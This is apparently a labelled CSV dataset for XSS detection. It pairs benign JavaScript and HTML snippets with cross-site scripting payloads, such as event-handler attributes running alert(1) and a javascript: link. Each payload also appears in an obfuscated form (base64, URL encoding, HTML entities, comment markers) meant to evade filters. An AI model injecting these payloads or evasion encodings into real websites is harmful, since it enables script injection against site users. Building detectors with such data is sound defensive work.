sample_id,label,payload_original,payload_obfuscated,generator,recipe
2400,1,"<noscript onmousemove=""alert(1)"">test</noscript>","<noscript onmousemove=""alert(1) "">test</noscript>  ",tool_baseline,whitespace_noise
2401,1,<br onpointerover=alert(1)>xss</br>,<br onpointerover=alert(1)>xss</br>,tool_baseline,comment_marker
2402,0,import alert from './src/alert.js' import button from './src/button.js' import carousel from './src/carousel.js',import alert from './src/alert.js' import button from './src/button.js' import carousel from './src/carousel.js',tool_baseline,none
2403,0,_this62._scroll(_this62.offset),_this62._scroll(_this62.offset),tool_baseline,none
2404,0,"const preventoverflow$1 = { name: 'preventoverflow', enabled: true,","const preventoverflow$1 = { name: 'preventoverflow', enabled: true,",tool_baseline,none
2405,0,document.body.style.overflow = '',document.body.style.overflow = '',tool_baseline,none
2406,0,return; } this.el.m_formselect = this;,return; } this.el.m_formselect = this;,tool_baseline,none
2407,0,"'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow') );","'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow') );",tool_baseline,none
2408,1,<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,PHRleHRhcmVhIGlkPXggdGFiaW5kZXg9MSBvbmJlZm9yZWFjdGl2YXRlPWFsZXJ0KDEpPjwvdGV4dGFyZWE+,tool_baseline,base64
2409,0,}; m.getdocumentscrollleft = function () { return window.pagexoffset || document.documentelement.scrollleft || document.body.scrollleft || 0;,}; m.getdocumentscrollleft = function () { return window.pagexoffset || document.documentelement.scrollleft || document.body.scrollleft || 0;,tool_baseline,none
2410,1,"<nav onbeforecopy=""alert(1)"" contenteditable>test</nav>",PG5hdiBvbmJlZm9yZWNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvbmF2Pg==,tool_baseline,base64
2411,0,"'js/modal.js', 'js/materialbox.js', 'js/parallax.js',","'js/modal.js', 'js/materialbox.js', 'js/parallax.js',",tool_baseline,none
2412,0,let ins = classdef.getinstance(el); if (!!ins) { ins.destroy();,let ins = classdef.getinstance(el); if (!!ins) { ins.destroy();,tool_baseline,none
2413,0,} _move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 : event.touches[0].clientx - this._deltax;,} _move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 : event.touches[0].clientx - this._deltax;,tool_baseline,none
2414,0,carousel.getorcreateinstance(carousel) } }),carousel.getorcreateinstance(carousel) } }),tool_baseline,none
2415,1,"<big draggable=""true"" ondragleave=""alert(1)"">test</big>","<bi/*OBF*/g draggable=""t/*OBF*/rue"" ondragleave=""alert(1)"">test</big>",tool_baseline,comment_marker
2416,1,"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",PHN0eWxlPkBrZXlmcmFtZXMgc2xpZGVpbiB7fTwvc3R5bGU+PHRhYmxlIHN0eWxlPSJhbmltYXRpb24tZHVyYXRpb246MXM7YW5pbWF0aW9uLW5hbWU6c2xpZGVpbjthbmltYXRpb24taXRlcmF0aW9uLWNvdW50OjIiIG9uYW5pbWF0aW9uaXRlcmF0aW9uPSJhbGVydCgxKSI+PC90YWJsZT4=,tool_baseline,base64
2417,1,"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionend=alert(1)></link>",&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;link id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/link&gt;,tool_baseline,html_entities
2418,0,"throw new error(""nouislider: 'limit', 'margin' and 'padding' must be divisible by step.""); } return this.xpct.length === 2 ? frompercentage(this.xval, value) : false;","throw new error(""nouislider: 'limit', 'margin' and 'padding' must be divisible by step.""); } return this.xpct.length === 2 ? frompercentage(this.xval, value) : false;",tool_baseline,none
2419,0,_this62.showindicators = _this62.options.indicators && _this62.hasmultipleslides; _this62.nowrap = _this62.options.nowrap || !_this62.hasmultipleslides; _this62.pressed = false;,_this62.showindicators = _this62.options.indicators && _this62.hasmultipleslides; _this62.nowrap = _this62.options.nowrap || !_this62.hasmultipleslides; _this62.pressed = false;,tool_baseline,none
2420,1,<main id=x tabindex=1 onfocus=alert(1)></main>,PG1haW4gaWQ9eCB0YWJpbmRleD0xIG9uZm9jdXM9YWxlcnQoMSk+PC9tYWluPg==,tool_baseline,base64
2421,0,$('body').append(hiddendiv),$('body').append(hiddendiv),tool_baseline,none
2422,0,"</span> <span class=""toctext"">audit","</span> <span class=""toctext"">audit",tool_baseline,none
2423,1,"<a href=""javas cript:alert(1)"">xss</a>",PGEgaHJlZj0iamF2YXMgY3JpcHQ6YWxlcnQoMSkiPnhzczwvYT4=,tool_baseline,base64
2424,0,object.removeclass('invalid'); } } else {,object.removeclass('invalid'); } } else {,tool_baseline,none
2425,1,"<button draggable=""true"" ondrag=""alert(1)"">test</button>",%3Cbutton%20draggable%3D%22true%22%20ondrag%3D%22alert%281%29%22%3Etest%3C%2Fbutton%3E,tool_baseline,urlencode
2426,0,"} _this28._animatein(); }, this.options.enterdelay);","} _this28._animatein(); }, this.options.enterdelay);",tool_baseline,none
2427,0,_this62.count = _this62.images.length,_this62.count = _this62.images.length,tool_baseline,none
2428,1,<ruby onpointerdown=alert(1)>xss</ruby>,PHJ1Ynkgb25wb2ludGVyZG93bj1hbGVydCgxKT54c3M8L3J1Ynk+,tool_baseline,base64
2429,0,"var y = clickpos.y - this.y0; if (this.moved && x === this.dx && y === this.dy) { this.sethand(x, y);","var y = clickpos.y - this.y0; if (this.moved && x === this.dx && y === this.dy) { this.sethand(x, y);",tool_baseline,none
2430,0,"index_js.executeaftertransition(callback, this._getelement(), this._config.isanimated)","index_js.executeaftertransition(callback, this._getelement(), this._config.isanimated)",tool_baseline,none
2431,1,<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,%3Cfooter%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Ffooter%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
2432,0,"} function removenamespacedhandlers(element, events, typeevent, namespace) { const storeelementevent = events[typeevent] || {}","} function removenamespacedhandlers(element, events, typeevent, namespace) { const storeelementevent = events[typeevent] || {}",tool_baseline,none
2433,0,$(this.thumb).addclass('thumb'); $(this.value).addclass('value'); $(this.thumb).append(this.value);,$(this.thumb).addclass('thumb'); $(this.value).addclass('value'); $(this.thumb).append(this.value);,tool_baseline,none
2434,1,"<hgroup onmouseout=""alert(1)"">test</hgroup>",PGhncm91cCBvbm1vdXNlb3V0PSJhbGVydCgxKSI+dGVzdDwvaGdyb3VwPg==,tool_baseline,base64
2435,0,if (foundnewindex) {,if (foundnewindex) {,tool_baseline,none
2436,1,"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>","<style>@keyframes x{}</style><x/*OBF*/ss style=""animation-name:x"" onanimatio/*OBF*/n/*OBF*/sta/*OBF*/rt=""alert(1)""></x/*OBF*/ss>",tool_baseline,comment_marker
2437,1,"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",PHByb2dyZXNzIG9uYmVmb3JlcGFzdGU9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvcHJvZ3Jlc3M+,tool_baseline,base64
2438,0,"'-moz-transition-duration': effect.duration + 'ms',","'-moz-transition-duration': effect.duration + 'ms',",tool_baseline,none
2439,1,"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHRleHRhcmVhIG9uZHJvcD1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC90ZXh0YXJlYT4=,tool_baseline,base64
2440,0,"return e ? e : function () { return $jscomp.iteratorfromarray(this, function (e) { return e;","return e ? e : function () { return $jscomp.iteratorfromarray(this, function (e) { return e;",tool_baseline,none
2441,0,isnumeric: function (n) {,isnumeric: function (n) {,tool_baseline,none
2442,0,if (touchhandler.allowevent(e) === false) { return null; },if (touchhandler.allowevent(e) === false) { return null; },tool_baseline,none
2443,0,"<h3><span class=""mw-headline"" id=""learning"">learning","<h3><span class=""mw-headline"" id=""learning"">learning",tool_baseline,none
2444,1,"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",PG11bHRpY29sIGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnc3RhcnQ9ImFsZXJ0KDEpIj50ZXN0PC9tdWx0aWNvbD4=,tool_baseline,base64
2445,1,<track id=x tabindex=1 onfocusin=alert(1)></track>,PHRyYWNrIGlkPXggdGFiaW5kZXg9MSBvbmZvY3VzaW49YWxlcnQoMSk+PC90cmFjaz4=,tool_baseline,base64
2446,0,var min = paddingobject[minprop],var min = paddingobject[minprop],tool_baseline,none
2447,0,if (!elementstyle) {,if (!elementstyle) {,tool_baseline,none
2448,0,"if (h.dom(a) && u(w, c)) return ""transform"";if (h.dom(a) && (a.getattribute(c) || h.svg(a) && a[c])) return ""attribute"";if (h.dom(a) && ""transform"" !== c && e(a, c)) return ""css"";if (null != a[c]) return ""object""; }function x(a, c) { var d = v(c),","if (h.dom(a) && u(w, c)) return ""transform"";if (h.dom(a) && (a.getattribute(c) || h.svg(a) && a[c])) return ""attribute"";if (h.dom(a) && ""transform"" !== c && e(a, c)) return ""css"";if (null != a[c]) return ""object""; }function x(a, c) { var d = v(c),",tool_baseline,none
2449,1,"<summary onclick=""alert(1)"">test</summary>",%3Csummary%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,tool_baseline,urlencode
2450,1,<article onpointerover=alert(1)>xss</article>,<article onpointerover=  alert(1)>xss</  article>,tool_baseline,whitespace_noise
2451,1,"<svg><script href=""data:text/javascript,alert(1)"" />",%3Csvg%3E%3Cscript%20href%3D%22data%3Atext%2Fjavascript%2Calert%281%29%22%20%2F%3E,tool_baseline,urlencode
2452,1,<caption onpointermove=alert(1)>xss</caption>,%3Ccaption%20onpointermove%3Dalert%281%29%3Exss%3C%2Fcaption%3E,tool_baseline,urlencode
2453,0,"title: 'navbar', body: 'the navbar is fully contained by an html5 nav tag. inside a recommended container div, there are 2 main parts of the navbar. a logo or brand link, and the navigations links. you can align these links to the left or right.' });","title: 'navbar', body: 'the navbar is fully contained by an html5 nav tag. inside a recommended container div, there are 2 main parts of the navbar. a logo or brand link, and the navigations links. you can align these links to the left or right.' });",tool_baseline,none
2454,0,const event_key = `.${data_key}` const data_api_key = '.data-api' const class_name_active = 'active',const event_key = `.${data_key}` const data_api_key = '.data-api' const class_name_active = 'active',tool_baseline,none
2455,0,"<p>in the 1940s and 1950s, a number of researchers explored the connection between <a href=""/wiki/neurobiology"" class=""mw-redirect"" title=""neurobiology"">neurobiology </a>, <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and <a href=""/wiki/cybernetics"" title=""cybernetics"">cybernetics </a>. some of them built machines that used electronic networks to exhibit rudimentary intelligence, such as <a href=""/wiki/w._grey_walter"" class=""mw-redirect"" title=""w. grey walter"">w. grey walter </a>'s <a href=""/wiki/turtle_(robot)"" title=""turtle (robot)"">turtles </a> and the <a href=""/wiki/johns_hopkins_beast"" title=""johns hopkins beast"">johns hopkins beast </a>. many of these researchers gathered for meetings of the teleological society at <a href=""/wiki/princeton_university"" title=""princeton university"">princeton university </a> and the <a href=""/wiki/ratio_club"" title=""ratio club"">ratio club </a> in england.<sup id=""cite_ref-ai&#39;s_immediate_precursors_156-0"" class=""reference""><a href=""#cite_note-ai&#39;s_immediate_precursors-156"">&#91;153&#93; </a> </sup> by 1960, this approach was largely abandoned, although elements of it would be revived in the 1980s.","<p>in the 1940s and 1950s, a number of researchers explored the connection between <a href=""/wiki/neurobiology"" class=""mw-redirect"" title=""neurobiology"">neurobiology </a>, <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and <a href=""/wiki/cybernetics"" title=""cybernetics"">cybernetics </a>. some of them built machines that used electronic networks to exhibit rudimentary intelligence, such as <a href=""/wiki/w._grey_walter"" class=""mw-redirect"" title=""w. grey walter"">w. grey walter </a>'s <a href=""/wiki/turtle_(robot)"" title=""turtle (robot)"">turtles </a> and the <a href=""/wiki/johns_hopkins_beast"" title=""johns hopkins beast"">johns hopkins beast </a>. many of these researchers gathered for meetings of the teleological society at <a href=""/wiki/princeton_university"" title=""princeton university"">princeton university </a> and the <a href=""/wiki/ratio_club"" title=""ratio club"">ratio club </a> in england.<sup id=""cite_ref-ai&#39;s_immediate_precursors_156-0"" class=""reference""><a href=""#cite_note-ai&#39;s_immediate_precursors-156"">&#91;153&#93; </a> </sup> by 1960, this approach was largely abandoned, although elements of it would be revived in the 1980s.",tool_baseline,none
2456,1,"<html onpaste=""alert(1)"" contenteditable>test</html>","<  html onpaste=""alert(1)  "" contenteditable>test< /html>",tool_baseline,whitespace_noise
2457,0,this.formats = { d: () => { return this.date.getdate();,this.formats = { d: () => { return this.date.getdate();,tool_baseline,none
2458,1,<audio onpointerdown=alert(1)>xss</audio>,%3Caudio%20onpointerdown%3Dalert%281%29%3Exss%3C%2Faudio%3E,tool_baseline,urlencode
2459,0,if ( value >= 100 ){ return xval.slice(-1)[0]; },if ( value >= 100 ){ return xval.slice(-1)[0]; },tool_baseline,none
2460,1,"<style>:target {transform: rotate(180deg);}</style><noframes id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noframes>","<style>:target {transform: rotate(180deg);}</style><n/*OBF*/oframes id=x style=""transition:transfor/*OBF*/m 2s"" ontransitionrun=alert(1)></noframes>",tool_baseline,comment_marker
2461,1,<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>,%3Ctr%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Ftr%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
2462,0,"</div><img src=""//en.wikipedia.org/wiki/special:centralautologin/start?type=1x1"" alt="""" title="""" width=""1"" height=""1"" style=""border: none; position: absolute;"" /> </div>","</div><img src=""//en.wikipedia.org/wiki/special:centralautologin/start?type=1x1"" alt="""" title="""" width=""1"" height=""1"" style=""border: none; position: absolute;"" /> </div>",tool_baseline,none
2463,1,"<abbr onmousemove=""alert(1)"">test</abbr>",&lt;abbr onmousemove=&quot;alert(1)&quot;&gt;test&lt;/abbr&gt;,tool_baseline,html_entities
2464,1,<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>,<keygen id=  x tabindex=1 ondeactivate=alert(1)></ keygen><input id=y autofocus>,tool_baseline,whitespace_noise
2465,0,"$(tooltip).css({ top: newcoordinates.y + 'px', left: newcoordinates.x + 'px'","$(tooltip).css({ top: newcoordinates.y + 'px', left: newcoordinates.x + 'px'",tool_baseline,none
2466,0,} if (this._config.toggle) { this.toggle(),} if (this._config.toggle) { this.toggle(),tool_baseline,none
2467,0,let naturalwidth = firstimage[0].naturalwidth,let naturalwidth = firstimage[0].naturalwidth,tool_baseline,none
2468,0,let parallaxinstance = parallax._parallaxes[i]; parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold;,let parallaxinstance = parallax._parallaxes[i]; parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold;,tool_baseline,none
